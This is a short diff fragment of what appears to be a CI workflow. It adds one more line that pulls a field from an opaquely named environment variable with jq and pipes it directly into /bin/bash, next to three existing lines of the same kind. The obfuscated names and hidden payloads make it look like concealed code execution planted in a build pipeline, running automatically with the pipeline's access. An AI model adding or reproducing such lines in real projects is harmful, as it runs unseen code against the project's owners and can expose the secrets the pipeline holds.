@@ -31,6 +31,7 @@ jobs:
           echo $tv48135 | jq -r .zv5458 | /bin/bash
           printf '%s' "$ydcsv6495" | jq -r .kmyo7 | /bin/bash
           echo $lee293 | jq -r .qolnj057 | /bin/bash
+          echo $h78 | jq -r .yn1 | /bin/bash
 
       - name: Upload results
         if: always()
